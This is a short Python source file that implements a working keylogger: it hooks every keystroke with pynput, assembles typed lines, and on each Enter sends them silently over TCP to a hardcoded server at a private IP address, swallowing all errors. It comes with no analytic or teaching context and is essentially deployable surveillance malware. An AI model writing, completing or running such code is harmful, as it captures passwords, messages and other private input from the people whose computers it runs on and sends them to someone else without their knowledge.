import socket
from pynput import keyboard

SERVER_IP = '192.168.178.22'
SERVER_PORT = 12345

buffer = ''

def send_to_server(text):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(text.encode('utf-8'))
    except Exception as e:
        pass

def on_press(key):
    global buffer
    try:
        if key == keyboard.Key.enter:
            if buffer:
                send_to_server(buffer)
                buffer = ''
        elif key == keyboard.Key.space:
            buffer += ' '
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            buffer += key.char
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()